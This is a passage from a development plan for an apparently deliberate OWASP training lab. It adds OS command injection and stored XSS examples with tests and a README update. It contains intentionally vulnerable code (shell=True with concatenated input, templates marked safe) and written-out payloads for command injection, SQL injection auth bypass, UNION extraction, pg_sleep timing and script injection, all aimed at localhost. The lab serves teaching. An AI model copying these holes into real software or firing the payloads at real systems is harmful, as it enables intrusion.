    <input type="text" class="form-control" name="username" value="{{ username }}" placeholder="Check if a username is taken">
    <button type="submit" class="btn btn-primary">Check</button>
  </div>
</form>
{% if exists is not none %}
<p>
  {% if exists %}That username is <strong>already taken</strong>.
  {% else %}That username is <strong>available</strong>.{% endif %}
</p>
{% endif %}
{% endblock %}
```

- [ ] **Step 5: Run test to verify it passes**

Run: `pytest tests/ -v`
Expected: all tests pass.

- [ ] **Step 6: Commit**

```bash
git add app/categories/a03_injection/routes.py \
  app/categories/a03_injection/templates/a03_injection/check_username.html tests/test_a03_check_username.py
git commit -m "feat: add A03 Hard blind time-based SQLi example"
```

---

### Task 7: A03 Hard — OS Command Injection in Host Lookup Tool

**Files:**
- Modify: `app/categories/a03_injection/routes.py`
- Create: `app/categories/a03_injection/templates/a03_injection/host_lookup.html`
- Create: `tests/test_a03_host_lookup.py`

**Interfaces:**
- Produces: route `a03_injection.host_lookup` (GET/POST `/a03/host-lookup`, no login required, no database interaction).

**Portability note:** the exploit uses `; echo <marker>` / `$(<command>)`, which works identically via `shell=True` on both macOS (dev/test machine) and Linux (Docker) regardless of whether `getent` itself is installed on a given host — if `getent` fails, its error goes to stderr while the injected command's output still lands in stdout, so the test only needs stdout to contain the injection proof.

- [ ] **Step 1: Write the failing test**

`tests/test_a03_host_lookup.py`:
```python
def test_host_lookup_accepts_a_host(client):
    response = client.post("/a03/host-lookup", data={"host": "localhost"})
    assert response.status_code == 200


def test_host_lookup_command_injection_executes_arbitrary_command(client):
    response = client.post(
        "/a03/host-lookup", data={"host": "localhost; echo INJECTION_PROOF_12345"}
    )
    assert response.status_code == 200
    assert b"INJECTION_PROOF_12345" in response.data


def test_host_lookup_command_injection_still_works_with_teaching_text_hidden(app, client):
    from app.core.models import Settings
    from app.extensions import db

    with app.app_context():
        settings = Settings.get()
        settings.show_explanations = False
        settings.show_exploit_instructions = False
        db.session.commit()

    response = client.post(
        "/a03/host-lookup", data={"host": "localhost; echo INJECTION_PROOF_12345"}
    )
    assert response.status_code == 200
    assert b"INJECTION_PROOF_12345" in response.data
    assert b"Explanation" not in response.data
    assert b"Exploitation" not in response.data


def test_host_lookup_link_appears_in_overview_once_registered(client):
    response = client.get("/a03/")
    assert response.status_code == 200
    assert b"OS Command Injection in Host Lookup Tool" in response.data
    assert b'href="/a03/host-lookup"' in response.data
```

- [ ] **Step 2: Run test to verify it fails**

Run: `pytest tests/test_a03_host_lookup.py -v`
Expected: FAIL with 404 on `/a03/host-lookup`.

- [ ] **Step 3: Modify `app/categories/a03_injection/routes.py`** — add `import subprocess` at the top and the `host_lookup` route

```python
import subprocess

from flask import render_template, request, session
```
(add `import subprocess` as a new line above the existing `from flask import ...` line)

```python
@a03_bp.route("/host-lookup", methods=["GET", "POST"])
def host_lookup():
    output = None
    host = ""
    if request.method == "POST":
        host = request.form.get("host", "")
        try:
            # VULNERABLE: shell=True with unsanitized, concatenated user input
            result = subprocess.run(
                f"getent hosts {host}",
                shell=True,
                capture_output=True,
                text=True,
                timeout=10,
            )
            output = result.stdout or result.stderr or "(no output)"
        except subprocess.TimeoutExpired:
            output = "(lookup timed out)"
    return render_template("a03_injection/host_lookup.html", host=host, output=output)
```

(add this after the `check_username` route)

- [ ] **Step 4: Write `app/categories/a03_injection/templates/a03_injection/host_lookup.html`**

```html
{% extends "core/example_page_base.html" %}
{% set example_title = "OS Command Injection in Host Lookup Tool" %}
{% set example_difficulty = "Hard" %}
{% block title %}{{ example_title }} — A03{% endblock %}

{% block explanation %}
<p>
  This tool resolves a hostname by shelling out to the system's <code>getent hosts</code>
  command, with the hostname concatenated directly into the shell string and
  <code>shell=True</code> handing the whole thing to <code>/bin/sh</code>. Because the
  input is unescaped, shell metacharacters — <code>;</code>, <code>&amp;&amp;</code>,
  <code>$(...)</code> — let you run entirely different commands.
</p>
{% endblock %}

{% block exploitation %}
<ol>
  <li>Try a normal lookup first, e.g. <code>localhost</code>.</li>
  <li>Now try: <code>localhost; whoami</code></li>
  <li>The output includes the result of <code>whoami</code> appended after the lookup —
      you've executed an arbitrary command on the server, running as whatever user the
      app container uses.</li>
  <li>Command substitution also works: <code>$(id)</code> runs <code>id</code> and
      substitutes its output directly into the "hostname" being looked up.</li>
</ol>
{% endblock %}

{% block live_example %}
<form method="post">
  <div class="input-group mb-3">
    <input type="text" class="form-control" name="host" value="{{ host }}" placeholder="e.g. localhost">
    <button type="submit" class="btn btn-primary">Look up</button>
  </div>
</form>
{% if output is not none %}
<pre>{{ output }}</pre>
{% endif %}
{% endblock %}
```

- [ ] **Step 5: Run test to verify it passes**

Run: `pytest tests/ -v`
Expected: all tests pass.

- [ ] **Step 6: Commit**

```bash
git add app/categories/a03_injection/routes.py \
  app/categories/a03_injection/templates/a03_injection/host_lookup.html tests/test_a03_host_lookup.py
git commit -m "feat: add A03 Hard OS command injection example"
```

---

### Task 8: A03 Hard — Stored XSS in Comments

**Files:**
- Modify: `app/categories/a03_injection/routes.py`
- Create: `app/categories/a03_injection/templates/a03_injection/comments.html`
- Create: `tests/test_a03_comments.py`

**Interfaces:**
- Consumes: `Comment` (Task 2).
- Produces: route `a03_injection.comments` (GET/POST `/a03/comments`, no login required) — this is the last of the plan's six graduated examples.

- [ ] **Step 1: Write the failing test**

`tests/test_a03_comments.py`:
```python
from app.core.seed import seed_database


def test_comments_page_shows_seeded_comment(app, client):
    seed_database(app)
    response = client.get("/a03/comments")
    assert response.status_code == 200
    assert b"Nice site" in response.data


def test_comments_stores_and_reflects_unescaped_script(app, client):
    seed_database(app)
    response = client.post(
        "/a03/comments",
        data={"author": "Attacker", "body": "<script>alert('xss')</script>"},
        follow_redirects=True,
    )
    assert response.status_code == 200
    assert b"<script>alert('xss')</script>" in response.data


def test_comments_stored_xss_still_works_with_teaching_text_hidden(app, client):
    from app.core.models import Settings
    from app.extensions import db

    seed_database(app)
    with app.app_context():
        settings = Settings.get()
        settings.show_explanations = False
        settings.show_exploit_instructions = False
        db.session.commit()

    response = client.post(
        "/a03/comments",
        data={"author": "Attacker", "body": "<script>alert('xss')</script>"},
        follow_redirects=True,
    )
    assert response.status_code == 200
    assert b"<script>alert('xss')</script>" in response.data
    assert b"Explanation" not in response.data
    assert b"Exploitation" not in response.data


def test_comments_link_appears_in_overview_once_registered(client):
    response = client.get("/a03/")
    assert response.status_code == 200
    assert b"Stored XSS in Comments" in response.data
    assert b'href="/a03/comments"' in response.data
```

- [ ] **Step 2: Run test to verify it fails**

Run: `pytest tests/test_a03_comments.py -v`
Expected: FAIL with 404 on `/a03/comments`.

- [ ] **Step 3: Modify `app/categories/a03_injection/routes.py`** — add imports and the `comments` route

```python
from flask import redirect, render_template, request, session, url_for
```
(add `redirect` and `url_for` to the existing `from flask import ...` line)

```python
from app.categories.a03_injection.models import Comment, InjectionAccount
```
(add `Comment` to the existing models import line)

```python
@a03_bp.route("/comments", methods=["GET", "POST"])
def comments():
    if request.method == "POST":
        author = request.form.get("author", "Anonymous")
        body = request.form.get("body", "")
        db.session.add(Comment(author=author, body=body))
        db.session.commit()
        return redirect(url_for("a03_injection.comments"))
    all_comments = Comment.query.order_by(Comment.id.desc()).all()
    return render_template("a03_injection/comments.html", comments=all_comments)
```

(add this after the `host_lookup` route — this is the last route in the file)

- [ ] **Step 4: Write `app/categories/a03_injection/templates/a03_injection/comments.html`**

```html
{% extends "core/example_page_base.html" %}
{% set example_title = "Stored XSS in Comments" %}
{% set example_difficulty = "Hard" %}
{% block title %}{{ example_title }} — A03{% endblock %}

{% block explanation %}
<p>
  This public comment form stores whatever you submit and renders it back to every
  future visitor without escaping the HTML — the template deliberately disables Jinja's
  automatic escaping for comment bodies. Unlike the reflected XSS example, this payload
  is <strong>stored</strong>: once submitted, it executes for every single visitor to
  this page, not just someone who clicks a crafted link.
</p>
{% endblock %}

{% block exploitation %}
<ol>
  <li>Submit a comment with the body:
      <code>&lt;script&gt;alert('stored XSS')&lt;/script&gt;</code></li>
  <li>Reload the page — the script executes immediately, with no link-clicking required.</li>
  <li>Every other visitor who loads this page from now on runs your script too, until
      "Reset lab" clears the comments table. A real attacker would use this to steal
      session cookies or perform actions as any visitor who views the page.</li>
</ol>
{% endblock %}

{% block live_example %}
<form method="post" class="mb-4">
  <div class="mb-2">
    <label class="form-label">Name</label>
    <input type="text" class="form-control" name="author" value="Guest">
  </div>
  <div class="mb-2">
    <label class="form-label">Comment</label>
    <textarea class="form-control" name="body" rows="2"></textarea>
  </div>
  <button type="submit" class="btn btn-primary">Post comment</button>
</form>
{% for comment in comments %}
<div class="border-bottom py-2">
  <strong>{{ comment.author }}</strong>
  <div>{{ comment.body|safe }}</div>
</div>
{% endfor %}
{% endblock %}
```

- [ ] **Step 5: Run test to verify it passes**

Run: `pytest tests/ -v`
Expected: all tests pass, 0 warnings — this is the full test suite for A03's scope.

- [ ] **Step 6: Commit**

```bash
git add app/categories/a03_injection/routes.py \
  app/categories/a03_injection/templates/a03_injection/comments.html tests/test_a03_comments.py
git commit -m "feat: add A03 Hard stored XSS example"
```

---

### Task 9: README update, Docker end-to-end verification

**Files:**
- Modify: `README.md`

**Interfaces:**
- Consumes: everything built in Tasks 1–8.
- Produces: updated category summary table; a manually-verified running container stack covering all six A03 exploits (including the Postgres-specific `pg_sleep` timing check pytest can't cover) plus the reset-restores-A03-state check — no automated test, this is the plan's final integration check.

- [ ] **Step 1: Modify `README.md`'s "What this is" prose and category summary table**

Update the "Currently implemented" sentence (around the top of the README) to add A03, e.g.:
```markdown
Currently implemented: **A01 Broken Access Control** (IDOR, missing function-level
authorization, mass assignment / role escalation), **A02 Cryptographic Failures**
(leaked credential dump, weak ECB encryption, predictable password-reset token), and
**A03 Injection** (SQL injection auth bypass, UNION-based exfiltration, reflected XSS,
blind time-based SQLi, OS command injection, stored XSS). Remaining categories
(A04–A10) are tracked separately and follow the same pattern.
```
Check the exact current wording first (it was already updated once for A02) and adjust precisely rather than assuming the surrounding text hasn't drifted.

Update the category summary table:
```markdown
| A01 Broken Access Control | Implemented | IDOR (Easy), Hidden Admin Panel (Medium), Mass Assignment Role Escalation (Hard) |
| A02 Cryptographic Failures | Implemented | Leaked Credential Dump (Easy), Weak Encryption / ECB Mode (Medium), Predictable Password Reset Token (Hard) |
| A03 Injection | Implemented | SQLi Auth Bypass (Easy), UNION SQLi Exfiltration (Medium), Reflected XSS (Medium), Blind Time-Based SQLi (Hard), OS Command Injection (Hard), Stored XSS (Hard) |
| A04–A10 | Planned | See `docs/superpowers/specs/2026-09-18-owasp-lab-design.md` |
```

- [ ] **Step 2: Rebuild and start the stack**

Run: `docker compose up --build -d`
Expected: both services healthy/running; no errors in `docker compose logs app`.

- [ ] **Step 3: Verify A03 overview and nav**

Run: `curl -s http://127.0.0.1:5001/a03/ | grep -i "Injection"`
Expected: match found. Confirm all six A03 example links appear on `/a03/` (the `registered_endpoints` guard should show all six now that every route exists), and that A01/A02/A03 appear in that sorted order in the top nav.

- [ ] **Step 4: Manually verify all six A03 exploits end-to-end**

```bash
# Easy: SQLi auth bypass
curl -s -X POST http://127.0.0.1:5001/a03/login -d "username=' OR '1'='1' --&password=x" | grep -i "authentication bypassed"

# Medium: UNION-based exfiltration
curl -s -G http://127.0.0.1:5001/a03/search --data-urlencode "q=' UNION SELECT id, value FROM a03_secrets -- " | grep -i "sk_live"

# Medium: reflected XSS
curl -s -G http://127.0.0.1:5001/a03/greet --data-urlencode "name=<script>alert(1)</script>" | grep -i "<script>alert(1)</script>"

# Hard: blind time-based SQLi -- this is the one exploit pytest cannot cover (SQLite has no pg_sleep);
# time this request and confirm it actually takes ~5 seconds against the real Postgres backend
time curl -s -G http://127.0.0.1:5001/a03/check-username --data-urlencode "username=nobody' OR (SELECT 1 FROM pg_sleep(5))=1-- "

# Hard: OS command injection
curl -s -X POST http://127.0.0.1:5001/a03/host-lookup -d "host=localhost; whoami" | grep -i "appuser"

# Hard: stored XSS
curl -s -X POST http://127.0.0.1:5001/a03/comments -d "author=Attacker&body=<script>alert('xss')</script>" -o /dev/null
curl -s http://127.0.0.1:5001/a03/comments | grep -o "<script>alert('xss')</script>"
```
Expected: each exploit succeeds exactly as described. The blind-SQLi `time curl` command should report a real elapsed time of roughly 5 seconds (`real 0m5.0Xs` or similar) — this is the one assertion in this whole plan that can only be verified here, against real Postgres, and is the reason Task 6's automated test deliberately used a boolean payload instead.

- [ ] **Step 5: Verify reset restores A03's clean state too**

```bash
curl -s -X POST http://127.0.0.1:5001/settings/reset -o /dev/null
curl -s http://127.0.0.1:5001/a03/comments | grep -c "alert('xss')"
```
Expected: `0` — the stored XSS comment and any other A03 tampering are gone, replaced by the original single seeded "Nice site..." comment.

- [ ] **Step 6: Tear down**

Run: `docker compose down`
Expected: containers stop cleanly.

- [ ] **Step 7: Commit**

```bash
git add README.md
git commit -m "docs: mark A03 Injection as implemented"
```
